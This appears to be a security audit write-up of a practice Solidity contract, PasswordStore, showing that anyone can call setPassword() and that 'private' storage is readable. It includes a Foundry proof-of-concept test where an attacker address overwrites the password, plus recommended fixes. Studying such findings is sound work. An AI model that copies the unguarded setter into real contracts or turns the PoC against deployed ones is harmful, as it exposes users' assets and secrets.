# PasswordStore_Audit_Report

## Summary

Anyone can call the ` setPassword() ` function to modify the ` s_password ` storage variable,but the contract is intended to allow only the owner to change the password;

And the private storage variable ` s_password ` is not truly private and can be viewed using tools;



## Vulnerability Details

The vulnerability is located in the ` setPassword() ` function on line 26 of the ` PasswordStore.sol ` file,which can be called by anyone to modify the password;

```solidity
/*
 * @notice This function allows only the owner to set a new password.
 * @param newPassword The new password to set.
 */
function setPassword(string memory newPassword) external {@audit - everyone can call this function,and then change the password
    s_password = newPassword;
    emit SetNetPassword();
}
```



## Proof of Concept

### Test Case

```solidity
contract PasswordStoreTest is Test {
    PasswordStore public passwordStore;
    DeployPasswordStore public deployer;
    address public owner;
    // attacker address
    address public attacker;

    function setUp() public {
        deployer = new DeployPasswordStore();
        passwordStore = deployer.run();
        owner = msg.sender;
        // create an attacker address
        attacker = makeAddr("attacker");
    }

    function test_poc_attacker_set_password() public {
        // set up the attacker to call the function
        vm.prank(attacker);
        string memory newPassword = "attackerPassword";
        // attacker call the function
        passwordStore.setPassword(newPassword);
        console.log("The attacker successfully set the password:", newPassword);
    }
}
```

### Run The Test

```bash
forge test --mt test_poc_attacker_set_password -vvvv
```

### Output

```bash
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/PasswordStore.t.sol:PasswordStoreTest
[PASS] test_poc_attacker_set_password() (gas: 22263)
Logs:
  The attacker successfully set the password: attackerPassword

Traces:
  [22263] PasswordStoreTest::test_poc_attacker_set_password()
    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return] 
    ├─ [7319] PasswordStore::setPassword("attackerPassword")
    │   ├─ emit SetNetPassword()
    │   └─ ← [Stop] 
    ├─ [0] console::log("The attacker successfully set the password:", "attackerPassword") [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.97ms (1.09ms CPU time)

Ran 1 test suite in 1.10s (6.97ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



## Impact

Anyone can call the ` setPassword() ` function to modify the ` s_password ` storage variable.



## Recommendation

1. Use the OpenZeppelin's ` Ownable ` library to improve it;

```solidity
+ import "@openzeppelin/contracts/ownership/Ownable.sol";

+ contract PasswordStore is Ownable{
    ...
    ...
    
+   function setPassword(string memory newPassword) external onlyOwner {
        s_password = newPassword;
        emit SetNetPassword();
    }
}
```

2. Add logic to check if ` msg.sender ` is the ` s_owner `;

```solidity
function setPassword(string memory newPassword) external {
    require(msg.sender == s_owner, "Not the owner!");
    s_password = newPassword;
    emit SetNetPassword();
}
```

